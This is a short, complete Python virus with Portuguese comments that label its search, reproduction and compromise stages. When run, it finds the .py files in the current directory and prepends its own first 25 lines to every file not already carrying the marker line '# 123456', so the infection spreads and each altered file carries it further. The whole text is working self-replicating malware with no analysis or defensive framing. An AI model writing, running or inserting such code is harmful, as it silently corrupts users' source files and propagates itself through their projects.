# 123456
import glob, os

# Mecanismo de busca
def search():
    return glob.glob("./*.py")

# Mecanismo de reprodução
def infect():
    files_list = search()
    file_name = os.path.basename(__file__)
    with open(file_name, "r") as itself:
        viral_content = "".join(itself.readlines()[0:25])
        for file in files_list:
            with open(file, "r+") as f:
                content = f.read()
                f.seek(0, 0)
                first_line = f.readline()
                if first_line != "# 123456\n":
                    f.seek(0, 0)
                    f.write(viral_content + "\n" + content)

# Mecanismo de comprometimento
infect()
